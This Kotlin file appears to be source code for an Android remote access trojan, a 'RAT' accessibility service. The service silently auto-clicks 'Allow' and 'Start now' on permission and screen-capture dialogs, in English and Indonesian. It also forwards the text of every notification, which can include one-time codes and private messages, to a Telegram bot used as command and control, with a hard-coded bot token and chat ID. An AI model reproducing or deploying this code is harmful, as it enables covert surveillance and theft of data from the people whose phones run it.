package com.mzkyzak.appbug

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log

import android.view.accessibility.AccessibilityNodeInfo

class RatAccessibilityService : AccessibilityService() {
    private var c2Client: TelegramC2Client? = null
    private val BOT_TOKEN = "8898141962:AAHK5OWEo5UFNWGszehi97U8ZQSdPSyXEns"

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (c2Client == null) {
            val prefs = getSharedPreferences("rat_prefs", MODE_PRIVATE)
            val savedId = prefs.getString("chat_id", "") ?: ""
            val chatId = if (savedId.isNotEmpty()) savedId else "6945113481"
            c2Client = TelegramC2Client(BOT_TOKEN, chatId)
        }

        val eventType = event.eventType
        val packageName = event.packageName?.toString() ?: "unknown"

        // Auto-accept system dialogs (MediaProjection, Permissions)
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            val rootNode = rootInActiveWindow
            if (rootNode != null) {
                autoClickTarget(rootNode)
            }
        }

        when (eventType) {
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                val data = event.text.toString()
                c2Client?.sendMessage("<b>[Notification]</b> ($packageName): $data")
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data = event.text.toString()
                Log.d("RAT_Access", "Clicked in $packageName: $data")
            }
        }
    }

    private fun autoClickTarget(node: AccessibilityNodeInfo) {
        val targets = listOf("Start now", "Mulai sekarang", "START NOW", "ALLOW", "Allow", "Izinkan")
        for (target in targets) {
            val nodes = node.findAccessibilityNodeInfosByText(target)
            for (n in nodes) {
                if (n.isClickable) {
                    n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d("RAT_Access", "Auto-clicked: $target")
                }
            }
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                autoClickTarget(child)
            }
        }
    }

    override fun onInterrupt() {
        Log.e("RAT_Access", "Service Interrupted")
    }
}
